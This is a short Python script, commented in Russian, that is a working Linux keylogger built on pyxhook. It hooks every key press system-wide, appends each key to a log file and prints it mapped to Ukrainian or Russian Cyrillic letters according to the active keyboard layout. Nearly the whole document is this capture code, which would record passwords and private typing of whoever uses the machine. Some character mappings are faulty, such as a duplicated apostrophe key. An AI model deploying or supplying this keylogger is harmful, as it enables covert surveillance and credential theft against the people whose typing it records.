# Доработаный скрипт который я нашел в инете к сожалению источник потерялся
# Работает под линуксами, тестировал в манжаро и убунту 20.04
# Детектит нажатые клавиши, но pyxhook не умеет работать с разными раскладками,
# по-этому используется xkbgroup и несколько словарей для маппинга английского
# на украинский и русский.
# Не работает только опредиление 'ы' на третьем уровне украинской раскладки.

import os
import pyxhook
from xkbgroup import XKeyboard


# эти словари нужны что-бы замапить английские буквы на кирилицу
cyr = {
'a': 'ф', 'b': 'и', 'c': 'c', 'd': 'в', 'e': 'e', 'f': 'а', 'g': 'п', 'h': 'р',
'i': 'ш', 'j': 'о', 'k': 'л', 'l': 'д', 'm': 'ь', 'n': 'т', 'o': 'щ', 'p': 'з',
'q': 'й', 'r': 'к', 't': 'е', 'u': 'г', 'v': 'м', 'w': 'ц', 'x': 'ч',
'y': 'н', 'z': 'я', 'A': 'Ф', 'B': 'И', 'C': 'C', 'D': 'В', 'E': 'E', 'F': 'А',
'G': 'П', 'H': 'Р','I': 'Ш', 'J': 'О', 'K': 'Л', 'L': 'Д', 'M': 'Ь', 'N': 'Т',
'O': 'Щ', 'P': 'З','Q': 'Й', 'R': 'К', 'T': 'Е', 'U': 'Г', 'V': 'М', 'W': 'Ц',
'X': 'Ч','Y': 'Н', 'Z': 'Я'
}
ua = {
's': 'і', 'S': 'І', 'bracketright': 'ї', 'braceright': 'Ї', '\'': 'є', '\'': 'Є',
}
ua.update(cyr)
ru = {
's': 'ы', 'S': 'Ы', 'bracketright': 'ъ', 'braceright': 'Ъ', '\'': 'э', '\'': 'Э',
}
ru.update(cyr)
###


# файл журнала.
log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('logging.log')
)
# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
       # File does not exist, or no permissions.
        pass


def return_key(lang, key):
    if lang == 'ua':
        return ua.get(key) if not ua.get(key) == None else key
    if lang == 'ru':
        return ru.get(key) if not ru.get(key) == None else key
    return key


#creating key pressing event and saving it into log file
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))
        print('keypress => ', return_key(XKeyboard().group_symbol, event.Key))
  
# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
